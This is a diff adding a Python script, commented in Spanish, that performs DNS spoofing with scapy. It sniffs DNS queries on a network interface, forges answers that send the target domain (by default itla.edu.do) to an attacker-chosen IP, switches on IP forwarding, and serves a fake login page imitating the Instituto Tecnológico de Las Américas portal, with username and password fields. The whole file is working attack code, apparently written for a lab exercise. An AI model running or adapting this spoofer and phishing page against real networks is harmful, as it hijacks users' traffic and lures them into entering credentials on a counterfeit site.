@@ -1,0 +1,138 @@
+#!/usr/bin/env python3
+
+from scapy.all import *
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import threading
+import argparse
+import signal
+import sys
+import os
+
+# Variables globales
+server = None
+target_domain = ""
+redirect_ip = ""
+
+# ==========================
+# FAKE WEB PAGE
+# ==========================
+
+class FakeHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
+        
+        fake_page = f"""
+        <html>
+        <head>
+            <title>ITLA - Portal Oficial</title>
+            <style>
+                body {{ font-family: Arial; background-color: #f4f4f4; text-align:center; }}
+                .box {{ margin-top:100px; padding:30px; background:white; width:50%; margin-left:auto; margin-right:auto; border-radius:10px; box-shadow:0px 0px 10px gray; }}
+                input {{ padding:10px; margin:10px; width:80%; }}
+                button {{ padding:10px 20px; background:#004aad; color:white; border:none; border-radius:5px; }}
+            </style>
+        </head>
+        <body>
+            <div class="box">
+                <h1>Instituto Tecnológico de Las Américas</h1>
+                <h3>Inicio de Sesión</h3>
+                <form>
+                    <input type="text" placeholder="Usuario"><br>
+                    <input type="password" placeholder="Contraseña"><br>
+                    <button>Ingresar</button>
+                </form>
+            </div>
+        </body>
+        </html>
+        """
+        self.wfile.write(fake_page.encode())
+
+# ==========================
+# START WEB SERVER
+# ==========================
+
+def start_web_server():
+    global server
+    server = HTTPServer(("0.0.0.0", 80), FakeHandler)
+    print("[+] Servidor web falso iniciado en puerto 80")
+    server.serve_forever()
+
+# ==========================
+# DNS SPOOF FUNCTION
+# ==========================
+
+def dns_spoof(packet):
+    if packet.haslayer(DNSQR):
+        qname = packet[DNSQR].qname.decode()
+        if target_domain in qname:
+            print(f"[+] Spoofing DNS request for {qname}")
+            
+            spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
+                          UDP(dport=packet[UDP].sport, sport=53) / \
+                          DNS(id=packet[DNS].id,
+                              qr=1,
+                              aa=1,
+                              qd=packet[DNS].qd,
+                              an=DNSRR(rrname=packet[DNSQR].qname,
+                                       ttl=10,
+                                       rdata=redirect_ip))
+            send(spoofed_pkt, verbose=0)
+
+# ==========================
+# CLEAN EXIT
+# ==========================
+
+def stop_all(signal_received=None, frame=None):
+    global server
+    print("\n[!] Deteniendo ataque y cerrando servidor...")
+    
+    try:
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    except:
+        pass
+
+    if server:
+        server.shutdown()
+        server.server_close()
+
+    sys.exit(0)
+
+# ==========================
+# MAIN
+# ==========================
+
+def main():
+    global target_domain
+    global redirect_ip
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-i", "--interface", required=True, help="Interfaz de red")
+    parser.add_argument("-d", "--domain", default="itla.edu.do", help="Dominio a spoofear")
+    parser.add_argument("-r", "--redirect", default="192.168.20.4", help="IP a redirigir")
+    args = parser.parse_args()
+
+    target_domain = args.domain
+    redirect_ip = args.redirect
+
+    print("=========== DNS SPOOFING ACTIVO ===========")
+    print(f"[+] Dominio objetivo: {target_domain}")
+    print(f"[+] Redirigiendo a: {redirect_ip}")
+
+    # Activar IP Forward
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+    # Manejar Ctrl+C
+    signal.signal(signal.SIGINT, stop_all)
+
+    # Iniciar servidor web en hilo separado
+    web_thread = threading.Thread(target=start_web_server)
+    web_thread.daemon = True
+    web_thread.start()
+
+    # Iniciar sniffing DNS
+    sniff(filter="udp port 53", iface=args.interface, store=False, prn=dns_spoof)
+
+if __name__ == "__main__":
+    main()
